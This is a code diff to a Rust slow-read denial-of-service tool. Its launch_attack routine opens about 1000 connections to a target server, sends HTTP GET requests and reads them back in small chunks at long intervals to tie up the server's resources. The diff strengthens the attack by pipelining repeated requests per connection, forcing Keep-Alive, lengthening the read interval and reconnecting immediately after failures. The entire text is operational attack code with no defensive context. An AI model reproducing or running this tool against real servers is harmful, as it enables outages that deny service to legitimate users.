@@ -31,8 +31,11 @@ struct Options {
     #[structopt(short = "a", long = "address", parse(from_str = "lookup_ip"))]
     address: SocketAddr,
 
-    #[structopt(short = "p", long = "path", default_value = "/")]
-    path: String,
+    #[structopt(short = "f", long = "file", default_value = "/")]
+    file: String,
+
+    #[structopt(short = "p", long = "pipeline_factor", default_value = "1")]
+    pipeline_factor: usize,
 
     #[structopt(
         short = "b",
@@ -42,17 +45,19 @@ struct Options {
     )]
     recv_buffer_size: usize,
 
-    #[structopt(short = "r", long = "read-len", default_value = "5")]
+    /// Bytes to read in a single read 
+    #[structopt(short = "r", long = "read-len", default_value = "32")]
     read_len: usize,
 
     #[structopt(short = "c", long = "connections", default_value = "1000")]
     connections: usize,
 
+    /// Interval between read operations in seconds
     #[structopt(
-        short = "w", long = "wait-time", default_value = "1", parse(from_str = "parse_duration")
+        short = "w", long = "wait-time", default_value = "5", parse(from_str = "parse_duration")
     )]
     wait_time: Duration,
-
+    
     #[structopt(
         short = "d",
         long = "attack-duration",
@@ -163,12 +168,13 @@ fn launch_attack(
     open_connections: Arc<AtomicUsize>,
 ) -> impl Future<Item = (), Error = ()> {
     let wait_time = options.wait_time;
-    let path = &options.path;
+    let file = &options.file;
     let read_len = options.read_len;
     let recv_buffer_size = options.recv_buffer_size;
+    let pipeline_factor = options.pipeline_factor;
 
-    let request = Request::get(url.to_owned() + path).body(()).unwrap();
-    let request = build_http_request(&request);
+    let request = Request::get(url.to_owned() + file).body(()).unwrap();
+    let request = build_http_request(&request).repeat(pipeline_factor);
 
     TcpStream::connect(&socket_addr)
         .map_err(|_| ())
@@ -194,7 +200,7 @@ fn launch_attack(
                 io::read_exact(tcp_stream, buf)
                     .then(move |res| {
                         let (wait_time, value) = match res {
-                            Err(_) => (Duration::from_secs(1), ok(Loop::Break(()))),
+                            Err(_) => (Duration::from_secs(0), ok(Loop::Break(()))),
                             Ok((tcp_stream, _)) => (wait_time, ok(Loop::Continue(tcp_stream)))
                         };
 
@@ -218,6 +224,7 @@ fn build_http_request(request: &Request<()>) -> String {
     req_str.push_str(request.uri().host().unwrap());
     req_str.push_str("\r\nUser-Agent: rust\r\n");
     req_str.push_str("Accept: */*\r\n");
+    req_str.push_str("Connection: Keep-Alive\r\n");
 
     req_str.push_str("\r\n");
 
